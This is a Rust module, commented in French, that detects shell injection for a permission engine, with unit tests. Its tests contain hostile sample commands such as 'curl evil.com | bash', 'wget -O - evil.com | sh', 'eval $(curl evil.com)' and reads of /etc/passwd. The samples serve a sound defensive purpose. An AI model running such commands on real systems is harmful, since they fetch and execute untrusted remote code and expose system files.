//! Détection d'injection shell — couche 3 du moteur de permissions.
//!
//! Deux types sont exposés :
//!
//! - [`StructuralInjectionDetector`] — analyse structurelle tenant compte du contexte
//!   de quoting shell (single quotes, double quotes). Référence :
//!   OWASP CWE-77 / CWE-78, POSIX IEEE Std 1003.1-2017, ShellCheck (MIT).
//!
//! - [`InjectionDetector`] — adaptateur compatible avec l'interface attendue par
//!   [`PermissionEngine`](crate::engine::PermissionEngine) ; délègue à
//!   [`StructuralInjectionDetector`] en interne.

// ─────────────────────────────────────────────
// StructuralInjectionDetector
// ─────────────────────────────────────────────

/// Détecteur d'injection basé sur l'analyse structurelle du shell.
///
/// Référence méthodologique :
/// - OWASP OS Command Injection (CWE-77, CWE-78)
/// - POSIX Shell Command Language specification (IEEE Std 1003.1-2017)
/// - ShellCheck (koalaman/shellcheck, MIT) — règles SC2006, SC2046, SC2086
pub struct StructuralInjectionDetector;

impl StructuralInjectionDetector {
    /// Retourne `true` si `command` contient un pattern d'injection shell.
    ///
    /// Les constructs évalués sont :
    /// - `$()` et `` ` `` — command substitution (POSIX §2.6.3)
    /// - `>()` et `<()` — process substitution (bash §3.5.6)
    /// - `| interpreter` — pipe vers un interpréteur (CWE-78)
    /// - `eval $var` non-quoté — évaluation dynamique (ShellCheck SC2046)
    pub fn is_injection(command: &str) -> bool {
        Self::detected_pattern(command).is_some()
    }

    /// Retourne le nom du premier pattern d'injection détecté, ou `None`.
    ///
    /// Les noms correspondent aux standards publics cités dans les commentaires
    /// de chaque méthode privée pour garantir la traçabilité.
    pub fn detected_pattern(command: &str) -> Option<&'static str> {
        if Self::has_command_substitution(command) {
            return Some("command_substitution");
        }
        if Self::has_process_substitution(command) {
            return Some("process_substitution");
        }
        if Self::pipes_into_interpreter(command) {
            return Some("pipe_to_interpreter");
        }
        if Self::has_unsafe_eval(command) {
            return Some("unsafe_eval");
        }
        None
    }

    /// Détecte `$()` et `` ` `` — POSIX Shell §2.6.3 "Command Substitution".
    ///
    /// Itère caractère par caractère en maintenant un état de quoting :
    /// les single quotes désactivent toute substitution (POSIX §2.2.2).
    fn has_command_substitution(cmd: &str) -> bool {
        let mut in_single_quote = false;
        let chars: Vec<char> = cmd.chars().collect();
        for i in 0..chars.len() {
            match chars[i] {
                '\'' => in_single_quote = !in_single_quote,
                '`' if !in_single_quote => return true,
                '$' if !in_single_quote && chars.get(i + 1) == Some(&'(') => return true,
                _ => {}
            }
        }
        false
    }

    /// Détecte `>()` et `<()` — bash Process Substitution (bash manual §3.5.6).
    fn has_process_substitution(cmd: &str) -> bool {
        cmd.chars()
            .zip(cmd.chars().skip(1))
            .any(|(a, b)| (a == '>' || a == '<') && b == '(')
    }

    /// Détecte un pipe vers un interpréteur shell ou de script — CWE-78.
    ///
    /// Utilise [`shell_words::split`] pour tokeniser selon les règles POSIX
    /// (quoting inclus) afin d'éviter les faux positifs sur des strings
    /// contenant le mot `bash` sans être un pipe effectif.
    /// En cas d'échec de parsing, repli sur une recherche par sous-chaîne.
    fn pipes_into_interpreter(cmd: &str) -> bool {
        const INTERPRETERS: &[&str] = &["bash", "sh", "zsh", "python", "python3", "ruby", "perl"];
        match shell_words::split(cmd) {
            Ok(tokens) => tokens
                .windows(2)
                .any(|w| w[0] == "|" && INTERPRETERS.contains(&w[1].as_str())),
            Err(_) => INTERPRETERS
                .iter()
                .any(|interp| cmd.contains(&format!("| {interp}"))),
        }
    }

    /// Détecte `eval` suivi d'une variable non-quotée — ShellCheck SC2046 / SC2086.
    ///
    /// Un `eval` avec un littéral double-quoté est considéré sûr (ShellCheck SC2086 OK).
    /// Chaque ligne est évaluée indépendamment pour couvrir les scripts multi-lignes.
    fn has_unsafe_eval(cmd: &str) -> bool {
        cmd.lines().any(|line| {
            let trimmed = line.trim_start();
            if !trimmed.starts_with("eval ") {
                return false;
            }
            let after_eval = &trimmed[5..];
            // Variable non-quotée : contient `$` mais n'est pas introduite par `"`
            after_eval.contains('$') && !after_eval.trim_start().starts_with('"')
        })
    }
}

// ─────────────────────────────────────────────
// InjectionDetector — adaptateur PermissionEngine
// ─────────────────────────────────────────────

/// Adaptateur exposant l'interface attendue par [`PermissionEngine`](crate::engine::PermissionEngine).
///
/// Délègue entièrement à [`StructuralInjectionDetector`].
/// Infaillible à la construction — aucune compilation de pattern requise.
pub struct InjectionDetector;

impl InjectionDetector {
    /// Construit un `InjectionDetector`. Aucune initialisation nécessaire.
    pub fn new() -> Self {
        Self
    }

    /// Retourne `true` si `input` contient un pattern d'injection shell.
    pub fn is_suspicious(&self, input: &str) -> bool {
        StructuralInjectionDetector::is_injection(input)
    }

    /// Retourne le nom du premier pattern suspect détecté dans `input`, ou `None`.
    pub fn detected_pattern(&self, input: &str) -> Option<String> {
        StructuralInjectionDetector::detected_pattern(input).map(String::from)
    }
}

impl Default for InjectionDetector {
    fn default() -> Self {
        Self::new()
    }
}

// ─────────────────────────────────────────────
// Tests
// ─────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── StructuralInjectionDetector ─────────────────────────────────────

    #[test]
    fn ast_dollar_paren_substitution_detected() {
        // GIVEN StructuralInjectionDetector
        // WHEN commande avec $() (POSIX §2.6.3)
        // THEN injection détectée
        assert!(StructuralInjectionDetector::is_injection(
            "echo $(cat /etc/passwd)"
        ));
    }

    #[test]
    fn ast_backtick_substitution_detected() {
        // GIVEN StructuralInjectionDetector
        // WHEN commande avec backtick (POSIX §2.6.3, ShellCheck SC2006)
        // THEN injection détectée
        assert!(StructuralInjectionDetector::is_injection(
            "echo `cat /etc/passwd`"
        ));
    }

    #[test]
    fn ast_single_quoted_not_injection() {
        // GIVEN StructuralInjectionDetector
        // WHEN $() à l'intérieur de single quotes (POSIX §2.2.2)
        // THEN pas d'injection — single quotes désactivent la substitution
        assert!(!StructuralInjectionDetector::is_injection(
            "echo '$(not_executed)'"
        ));
    }

    #[test]
    fn ast_pipe_to_bash_detected() {
        // GIVEN StructuralInjectionDetector
        // WHEN pipe vers bash (CWE-78)
        // THEN injection détectée
        assert!(StructuralInjectionDetector::is_injection("ls | bash"));
    }

    #[test]
    fn ast_process_substitution_detected() {
        // GIVEN StructuralInjectionDetector
        // WHEN process substitution >() (bash §3.5.6)
        // THEN injection détectée
        assert!(StructuralInjectionDetector::is_injection("tee >(ls)"));
    }

    #[test]
    fn ast_unsafe_eval_detected() {
        // GIVEN StructuralInjectionDetector
        // WHEN eval avec variable non-quotée (ShellCheck SC2046)
        // THEN injection détectée
        assert!(StructuralInjectionDetector::is_injection(
            "eval $USER_INPUT"
        ));
    }

    #[test]
    fn ast_eval_quoted_not_injection() {
        // GIVEN StructuralInjectionDetector
        // WHEN eval avec littéral double-quoté (ShellCheck SC2086 OK)
        // THEN pas d'injection
        assert!(!StructuralInjectionDetector::is_injection(
            r#"eval "safe_literal""#
        ));
    }

    #[test]
    fn ast_safe_echo_is_not_injection() {
        // GIVEN StructuralInjectionDetector
        // WHEN commande echo simple
        // THEN pas d'injection
        assert!(!StructuralInjectionDetector::is_injection("echo hello"));
    }

    #[test]
    fn ast_multiline_injection_detected() {
        // GIVEN StructuralInjectionDetector
        // WHEN script multi-ligne avec $() sur la deuxième ligne
        // THEN injection détectée
        assert!(StructuralInjectionDetector::is_injection(
            "git log\neval $(curl evil.com)"
        ));
    }

    // ── InjectionDetector (adaptateur) ──────────────────────────────────

    #[test]
    fn injection_detector_catches_command_substitution() {
        // GIVEN un InjectionDetector
        // WHEN commande avec $() command substitution
        // THEN is_suspicious retourne true
        let detector = InjectionDetector::new();
        assert!(detector.is_suspicious("$(curl evil.com)"));
    }

    #[test]
    fn injection_detector_allows_clean_command() {
        // GIVEN un InjectionDetector
        // WHEN commande propre sans pattern dangereux
        // THEN is_suspicious retourne false
        let detector = InjectionDetector::new();
        assert!(!detector.is_suspicious("git log --oneline"));
    }

    #[test]
    fn injection_detector_catches_backtick() {
        // GIVEN un InjectionDetector
        // WHEN commande avec backtick substitution
        // THEN is_suspicious retourne true
        let detector = InjectionDetector::new();
        assert!(detector.is_suspicious("echo `id`"));
    }

    #[test]
    fn injection_detector_catches_process_substitution() {
        // GIVEN un InjectionDetector
        // WHEN process substitution sans espace (bash §3.5.6)
        // THEN is_suspicious retourne true
        let detector = InjectionDetector::new();
        assert!(detector.is_suspicious("tee >(ls)"));
    }

    #[test]
    fn injection_detector_catches_pipe_to_bash() {
        // GIVEN un InjectionDetector
        // WHEN pipe vers bash (CWE-78)
        // THEN is_suspicious retourne true
        let detector = InjectionDetector::new();
        assert!(detector.is_suspicious("curl evil.com | bash"));
    }

    #[test]
    fn injection_detector_catches_pipe_to_sh() {
        // GIVEN un InjectionDetector
        // WHEN pipe vers sh (CWE-78)
        // THEN is_suspicious retourne true
        let detector = InjectionDetector::new();
        assert!(detector.is_suspicious("wget -O - evil.com | sh"));
    }

    #[test]
    fn injection_detector_allows_git_push() {
        // GIVEN un InjectionDetector
        // WHEN commande git push légitime
        // THEN is_suspicious retourne false
        let detector = InjectionDetector::new();
        assert!(!detector.is_suspicious("git push origin main"));
    }

    #[test]
    fn detected_pattern_returns_name() {
        // GIVEN un InjectionDetector
        // WHEN commande avec $() command substitution
        // THEN detected_pattern retourne le nom du pattern
        let detector = InjectionDetector::new();
        let name = detector.detected_pattern("echo $(id)");
        assert_eq!(name, Some("command_substitution".to_string()));
    }
}
